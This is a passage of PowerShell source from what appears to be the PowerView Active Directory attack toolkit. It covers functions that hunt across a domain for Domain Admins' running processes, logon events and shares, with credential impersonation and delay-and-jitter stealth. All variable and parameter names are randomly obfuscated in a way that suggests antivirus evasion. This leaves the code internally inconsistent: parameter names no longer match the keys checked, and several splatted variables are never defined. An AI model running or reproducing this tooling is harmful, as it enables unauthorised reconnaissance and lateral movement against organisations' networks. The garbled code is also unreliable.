                                        $rCDKol0ecQa4 = Test-AdminAccess -mA $ftzgP9UbIARn26koF3CEKXm
                                        $W | Add-Member Noteproperty 'LocalAdmin' $rCDKol0ecQa4.IsAdmin
                                    }
                                    else {
                                        $W | Add-Member Noteproperty 'LocalAdmin' $qYFR5PCZruUkdna9T
                                    }
                                    $W.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $W
                                }
                            }
                        }
                    }
                }
            }

            if ($5) {
                Invoke-RevertToSelf
            }
        }

        $QWX1OeqTMV876JyRF = $qYFR5PCZruUkdna9T
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
            }
            else {
                $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k -N1xWHfZFbIiRSwgEOjKdtk
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $($IolOzRrjd13cuX6HE.count)"
            Write-Verbose "[Find-DomainUserLocation] Delay: $BLzXIZ, Jitter: $ihajtIg"
            $Rh20Opw9tSA3v = 0
            $nmZcyGY5SOqoDKFvr7eM038 = New-Object System.Random

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $IolOzRrjd13cuX6HE) {
                $Rh20Opw9tSA3v = $Rh20Opw9tSA3v + 1

                
                Start-Sleep -Seconds $nmZcyGY5SOqoDKFvr7eM038.Next((1-$ihajtIg)*$BLzXIZ, (1+$ihajtIg)*$BLzXIZ)

                Write-Verbose "[Find-DomainUserLocation] Enumerating server $TfIJKo1L ($Rh20Opw9tSA3v of $($IolOzRrjd13cuX6HE.Count))"
                Invoke-Command -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ArgumentList $ftzgP9UbIARn26koF3CEKXm, $zIncrjedPYEVw86obgSX, $iClcO, $W5ad726eNyS4b, $QWX1OeqTMV876JyRF

                if ($2KUDvV2HojTSzhMzNmslFPRL -and $4A4Oqrnq) {
                    Write-Verbose "[Find-DomainUserLocation] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserLocation] Using threading with threads: $JcIMRzC5Kitl"
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($IolOzRrjd13cuX6HE.Length)"

            
            $VH = @{
                'TargetUsers' = $zIncrjedPYEVw86obgSX
                'CurrentUser' = $iClcO
                'Stealth' = $W5ad726eNyS4b
                'TokenHandle' = $QWX1OeqTMV876JyRF
            }

            
            New-ThreadedFunction -mA $IolOzRrjd13cuX6HE -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ScriptParameters $VH -JcIMRzC5Kitl $JcIMRzC5Kitl
        }
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Find-DomainProcess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $mA,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [String]
        $hm9FLfR3U5b,

        [ValidateNotNullOrEmpty()]
        [String]
        $DyvdAEbkrnqStxLz0wmTgV9Kc,

        [ValidateNotNullOrEmpty()]
        [String]
        $xrToHFMttDhJiKTDH2QzEmKol,

        [Alias('Unconstrained')]
        [Switch]
        $KBM1AGhz05RscnjU,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hv47qcP,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $9s,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $g5wRdT3IbUS2zkc,

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $hiAGkEv1rc8FyJ0Db,

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tHSPwRinjZ69gl0v5fMEQU,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $hZmS,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $XguMCq,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $BLrktsm69gaeEYvXp1jZ0,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $Edi4yY = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $ZC1v3RySBXFbIACqXTCyUXQ,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $4A4Oqrnq,

        [ValidateRange(1, 10000)]
        [Int]
        $BLzXIZ = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ihajtIg = .3,

        [Int]
        [ValidateRange(1, 100)]
        $JcIMRzC5Kitl = 20
    )

    BEGIN {
        $fYHM6rC1lTm = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $fYHM6rC1lTm['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['ComputerDomain']) { $fYHM6rC1lTm['Domain'] = $hm9FLfR3U5b }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $fYHM6rC1lTm['LDAPFilter'] = $DyvdAEbkrnqStxLz0wmTgV9Kc }
        if ($PSBoundParameters['ComputerSearchBase']) { $fYHM6rC1lTm['SearchBase'] = $xrToHFMttDhJiKTDH2QzEmKol }
        if ($PSBoundParameters['Unconstrained']) { $fYHM6rC1lTm['Unconstrained'] = $eXoNv092dGwM1UuRD }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $fYHM6rC1lTm['OperatingSystem'] = $c5fth3UNK }
        if ($PSBoundParameters['ComputerServicePack']) { $fYHM6rC1lTm['ServicePack'] = $txAlgojF79hMWarPfHVYk }
        if ($PSBoundParameters['ComputerSiteName']) { $fYHM6rC1lTm['SiteName'] = $M6Sb30DA }
        if ($PSBoundParameters['Server']) { $fYHM6rC1lTm['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $fYHM6rC1lTm['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $fYHM6rC1lTm['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $fYHM6rC1lTm['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $fYHM6rC1lTm['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $fYHM6rC1lTm['Credential'] = $3ezVSfm6f4k }

        $ogjQd7VXw4PS0fCM5yLTDnlcY = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Identity'] = $tHSPwRinjZ69gl0v5fMEQU }
        if ($PSBoundParameters['Domain']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['UserDomain']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Domain'] = $hZmS }
        if ($PSBoundParameters['UserLDAPFilter']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['LDAPFilter'] = $XguMCq }
        if ($PSBoundParameters['UserSearchBase']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['SearchBase'] = $BLrktsm69gaeEYvXp1jZ0 }
        if ($PSBoundParameters['UserAdminCount']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['AdminCount'] = $ZC1v3RySBXFbIACqXTCyUXQ }
        if ($PSBoundParameters['Server']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Credential'] = $3ezVSfm6f4k }


        
        if ($PSBoundParameters['ComputerName']) {
            $IolOzRrjd13cuX6HE = $mA
        }
        else {
            Write-Verbose '[Find-DomainProcess] Querying computers in the domain'
            $IolOzRrjd13cuX6HE = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $($IolOzRrjd13cuX6HE.Length)"
        if ($IolOzRrjd13cuX6HE.Length -eq 0) {
            throw '[Find-DomainProcess] No hosts found to enumerate'
        }

        
        if ($PSBoundParameters['ProcessName']) {
            $ie6Ba1 = @()
            ForEach ($83jzuelUWZq in $hiAGkEv1rc8FyJ0Db) {
                $ie6Ba1 += $83jzuelUWZq.Split(',')
            }
            if ($ie6Ba1 -isnot [System.Array]) {
                $ie6Ba1 = [String[]] @($ie6Ba1)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $zIncrjedPYEVw86obgSX = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $Hd3F1E = @{
                'Identity' = $Edi4yY
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $Hd3F1E['Domain'] = $hZmS }
            if ($PSBoundParameters['UserSearchBase']) { $Hd3F1E['SearchBase'] = $BLrktsm69gaeEYvXp1jZ0 }
            if ($PSBoundParameters['Server']) { $Hd3F1E['Server'] = $Gkd0Hz5f }
            if ($PSBoundParameters['SearchScope']) { $Hd3F1E['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
            if ($PSBoundParameters['ResultPageSize']) { $Hd3F1E['ResultPageSize'] = $dTP7Qv6RslNUx }
            if ($PSBoundParameters['ServerTimeLimit']) { $Hd3F1E['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
            if ($PSBoundParameters['Tombstone']) { $Hd3F1E['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
            if ($PSBoundParameters['Credential']) { $Hd3F1E['Credential'] = $3ezVSfm6f4k }
            $Hd3F1E
            $zIncrjedPYEVw86obgSX = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        
        $p1gY8tCQOFWmJ0zubMcak2 = {
            Param($mA, $hiAGkEv1rc8FyJ0Db, $zIncrjedPYEVw86obgSX, $3ezVSfm6f4k)

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $mA) {
                $4zYXe6sFagylcbNCipAf = Test-Connection -Count 1 -N1xWHfZFbIiRSwgEOjKdtk -mA $ftzgP9UbIARn26koF3CEKXm
                if ($4zYXe6sFagylcbNCipAf) {
                    
                    
                    if ($3ezVSfm6f4k) {
                        $MCXKtrcnALq9TBfvE27y = Get-WMIProcess -3ezVSfm6f4k $3ezVSfm6f4k -mA $ftzgP9UbIARn26koF3CEKXm -ErrorAction SilentlyContinue
                    }
                    else {
                        $MCXKtrcnALq9TBfvE27y = Get-WMIProcess -mA $ftzgP9UbIARn26koF3CEKXm -ErrorAction SilentlyContinue
                    }
                    ForEach ($2f9FjDCRdN8Jo in $MCXKtrcnALq9TBfvE27y) {
                        
                        if ($hiAGkEv1rc8FyJ0Db) {
                            if ($hiAGkEv1rc8FyJ0Db -Contains $2f9FjDCRdN8Jo.ProcessName) {
                                $2f9FjDCRdN8Jo
                            }
                        }
                        
                        elseif ($zIncrjedPYEVw86obgSX -Contains $2f9FjDCRdN8Jo.User) {
                            $2f9FjDCRdN8Jo
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainProcess] Total number of hosts: $($IolOzRrjd13cuX6HE.count)"
            Write-Verbose "[Find-DomainProcess] Delay: $BLzXIZ, Jitter: $ihajtIg"
            $Rh20Opw9tSA3v = 0
            $nmZcyGY5SOqoDKFvr7eM038 = New-Object System.Random

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $IolOzRrjd13cuX6HE) {
                $Rh20Opw9tSA3v = $Rh20Opw9tSA3v + 1

                
                Start-Sleep -Seconds $nmZcyGY5SOqoDKFvr7eM038.Next((1-$ihajtIg)*$BLzXIZ, (1+$ihajtIg)*$BLzXIZ)

                Write-Verbose "[Find-DomainProcess] Enumerating server $ftzgP9UbIARn26koF3CEKXm ($Rh20Opw9tSA3v of $($IolOzRrjd13cuX6HE.count))"
                $2KUDvV2HojTSzhMzNmslFPRL = Invoke-Command -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ArgumentList $ftzgP9UbIARn26koF3CEKXm, $ie6Ba1, $zIncrjedPYEVw86obgSX, $3ezVSfm6f4k
                $2KUDvV2HojTSzhMzNmslFPRL

                if ($2KUDvV2HojTSzhMzNmslFPRL -and $4A4Oqrnq) {
                    Write-Verbose "[Find-DomainProcess] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainProcess] Using threading with threads: $JcIMRzC5Kitl"

            
            $VH = @{
                'ProcessName' = $ie6Ba1
                'TargetUsers' = $zIncrjedPYEVw86obgSX
                'Credential' = $3ezVSfm6f4k
            }

            
            New-ThreadedFunction -mA $IolOzRrjd13cuX6HE -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ScriptParameters $VH -JcIMRzC5Kitl $JcIMRzC5Kitl
        }
    }
}


function Find-DomainUserEvent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA,

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Iq7bLVAvhKnpjdMlH2,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $Ylu8TrUAPzW7fO1M3bjHE2Gx = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $S28dVfimx = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $5w9hXo = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $tHSPwRinjZ69gl0v5fMEQU,

        [ValidateNotNullOrEmpty()]
        [String]
        $hZmS,

        [ValidateNotNullOrEmpty()]
        [String]
        $XguMCq,

        [ValidateNotNullOrEmpty()]
        [String]
        $BLrktsm69gaeEYvXp1jZ0,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $Edi4yY = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $ZC1v3RySBXFbIACqXTCyUXQ,

        [Switch]
        $5jmN,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $4A4Oqrnq,

        [ValidateRange(1, 10000)]
        [Int]
        $BLzXIZ = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ihajtIg = .3,

        [Int]
        [ValidateRange(1, 100)]
        $JcIMRzC5Kitl = 20
    )

    BEGIN {
        $ogjQd7VXw4PS0fCM5yLTDnlcY = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Identity'] = $tHSPwRinjZ69gl0v5fMEQU }
        if ($PSBoundParameters['UserDomain']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Domain'] = $hZmS }
        if ($PSBoundParameters['UserLDAPFilter']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['LDAPFilter'] = $XguMCq }
        if ($PSBoundParameters['UserSearchBase']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['SearchBase'] = $BLrktsm69gaeEYvXp1jZ0 }
        if ($PSBoundParameters['UserAdminCount']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['AdminCount'] = $ZC1v3RySBXFbIACqXTCyUXQ }
        if ($PSBoundParameters['Server']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Credential'] = $3ezVSfm6f4k }

        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $zIncrjedPYEVw86obgSX = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            
            $Hd3F1E = @{
                'Identity' = $Edi4yY
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $Edi4yY"
            if ($PSBoundParameters['UserDomain']) { $Hd3F1E['Domain'] = $hZmS }
            if ($PSBoundParameters['UserSearchBase']) { $Hd3F1E['SearchBase'] = $BLrktsm69gaeEYvXp1jZ0 }
            if ($PSBoundParameters['Server']) { $Hd3F1E['Server'] = $Gkd0Hz5f }
            if ($PSBoundParameters['SearchScope']) { $Hd3F1E['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
            if ($PSBoundParameters['ResultPageSize']) { $Hd3F1E['ResultPageSize'] = $dTP7Qv6RslNUx }
            if ($PSBoundParameters['ServerTimeLimit']) { $Hd3F1E['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
            if ($PSBoundParameters['Tombstone']) { $Hd3F1E['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
            if ($PSBoundParameters['Credential']) { $Hd3F1E['Credential'] = $3ezVSfm6f4k }
            $zIncrjedPYEVw86obgSX = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        
        if ($PSBoundParameters['ComputerName']) {
            $IolOzRrjd13cuX6HE = $mA
        }
        else {
            
            $DCSearcherArgumentsrG = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $DCSearcherArgumentsrG['Domain'] = $3Ecdwi8qNy }
            if ($PSBoundParameters['Server']) { $DCSearcherArgumentsrG['Server'] = $Gkd0Hz5f }
            if ($PSBoundParameters['Credential']) { $DCSearcherArgumentsrG['Credential'] = $3ezVSfm6f4k }
            Write-Verbose "[Find-DomainUserEvent] Querying for domain controllers in domain: $3Ecdwi8qNy"
            $IolOzRrjd13cuX6HE = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($IolOzRrjd13cuX6HE -and ($IolOzRrjd13cuX6HE -isnot [System.Array])) {
            $IolOzRrjd13cuX6HE = @(,$IolOzRrjd13cuX6HE)
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $($IolOzRrjd13cuX6HE.Length)"
        Write-Verbose "[Find-DomainUserEvent] TargetComputers $IolOzRrjd13cuX6HE"
        if ($IolOzRrjd13cuX6HE.Length -eq 0) {
            throw '[Find-DomainUserEvent] No hosts found to enumerate'
        }

        
        $p1gY8tCQOFWmJ0zubMcak2 = {
            Param($mA, $Ylu8TrUAPzW7fO1M3bjHE2Gx, $S28dVfimx, $5w9hXo, $zIncrjedPYEVw86obgSX, $Iq7bLVAvhKnpjdMlH2, $3ezVSfm6f4k)

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $mA) {
                $4zYXe6sFagylcbNCipAf = Test-Connection -Count 1 -N1xWHfZFbIiRSwgEOjKdtk -mA $ftzgP9UbIARn26koF3CEKXm
                if ($4zYXe6sFagylcbNCipAf) {
                    $Y8a9c = @{
                        'ComputerName' = $ftzgP9UbIARn26koF3CEKXm
                    }
                    if ($Ylu8TrUAPzW7fO1M3bjHE2Gx) { $Y8a9c['StartTime'] = $Ylu8TrUAPzW7fO1M3bjHE2Gx }
                    if ($S28dVfimx) { $Y8a9c['EndTime'] = $S28dVfimx }
                    if ($5w9hXo) { $Y8a9c['MaxEvents'] = $5w9hXo }
                    if ($3ezVSfm6f4k) { $Y8a9c['Credential'] = $3ezVSfm6f4k }
                    if ($Iq7bLVAvhKnpjdMlH2 -or $zIncrjedPYEVw86obgSX) {
                        if ($zIncrjedPYEVw86obgSX) {
                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$zIncrjedPYEVw86obgSX -contains $_.TargetUserName}
                        }
                        else {
                            $ja = 'or'
                            $Iq7bLVAvhKnpjdMlH2.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($Iq7bLVAvhKnpjdMlH2[$_] -match '&') -or ($Iq7bLVAvhKnpjdMlH2[$_] -eq 'and')) {
                                        $ja = 'and'
                                    }
                                }
                            }
                            $Q8GsfoTjRCBhcrwEZI9PSv = $Iq7bLVAvhKnpjdMlH2.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {
                                if ($ja -eq 'or') {
                                    ForEach ($FcI0EDWeGRPBgi9YlykU in $Q8GsfoTjRCBhcrwEZI9PSv) {
                                        if ($_."$FcI0EDWeGRPBgi9YlykU" -match $Iq7bLVAvhKnpjdMlH2[$FcI0EDWeGRPBgi9YlykU]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach ($FcI0EDWeGRPBgi9YlykU in $Q8GsfoTjRCBhcrwEZI9PSv) {
                                        if ($_."$FcI0EDWeGRPBgi9YlykU" -notmatch $Iq7bLVAvhKnpjdMlH2[$FcI0EDWeGRPBgi9YlykU]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $($IolOzRrjd13cuX6HE.count)"
            Write-Verbose "[Find-DomainUserEvent] Delay: $BLzXIZ, Jitter: $ihajtIg"
            $Rh20Opw9tSA3v = 0
            $nmZcyGY5SOqoDKFvr7eM038 = New-Object System.Random

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $IolOzRrjd13cuX6HE) {
                $Rh20Opw9tSA3v = $Rh20Opw9tSA3v + 1

                
                Start-Sleep -Seconds $nmZcyGY5SOqoDKFvr7eM038.Next((1-$ihajtIg)*$BLzXIZ, (1+$ihajtIg)*$BLzXIZ)

                Write-Verbose "[Find-DomainUserEvent] Enumerating server $ftzgP9UbIARn26koF3CEKXm ($Rh20Opw9tSA3v of $($IolOzRrjd13cuX6HE.count))"
                $2KUDvV2HojTSzhMzNmslFPRL = Invoke-Command -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ArgumentList $ftzgP9UbIARn26koF3CEKXm, $Ylu8TrUAPzW7fO1M3bjHE2Gx, $S28dVfimx, $5w9hXo, $zIncrjedPYEVw86obgSX, $Iq7bLVAvhKnpjdMlH2, $3ezVSfm6f4k
                $2KUDvV2HojTSzhMzNmslFPRL

                if ($2KUDvV2HojTSzhMzNmslFPRL -and $4A4Oqrnq) {
                    Write-Verbose "[Find-DomainUserEvent] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserEvent] Using threading with threads: $JcIMRzC5Kitl"

            
            $VH = @{
                'StartTime' = $Ylu8TrUAPzW7fO1M3bjHE2Gx
                'EndTime' = $S28dVfimx
                'MaxEvents' = $5w9hXo
                'TargetUsers' = $zIncrjedPYEVw86obgSX
                'Filter' = $Iq7bLVAvhKnpjdMlH2
                'Credential' = $3ezVSfm6f4k
            }

            
            New-ThreadedFunction -mA $IolOzRrjd13cuX6HE -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ScriptParameters $VH -JcIMRzC5Kitl $JcIMRzC5Kitl
        }
    }
}


function Find-DomainShare {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $mA,

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $hm9FLfR3U5b,

        [ValidateNotNullOrEmpty()]
        [String]
        $DyvdAEbkrnqStxLz0wmTgV9Kc,

        [ValidateNotNullOrEmpty()]
        [String]
        $xrToHFMttDhJiKTDH2QzEmKol,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hv47qcP,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $9s,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $g5wRdT3IbUS2zkc,

        [Alias('CheckAccess')]
        [Switch]
        $5GziPpdnx27jR01h,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $BLzXIZ = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ihajtIg = .3,

        [Int]
        [ValidateRange(1, 100)]
        $JcIMRzC5Kitl = 20
    )

    BEGIN {

        $fYHM6rC1lTm = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $fYHM6rC1lTm['Domain'] = $hm9FLfR3U5b }
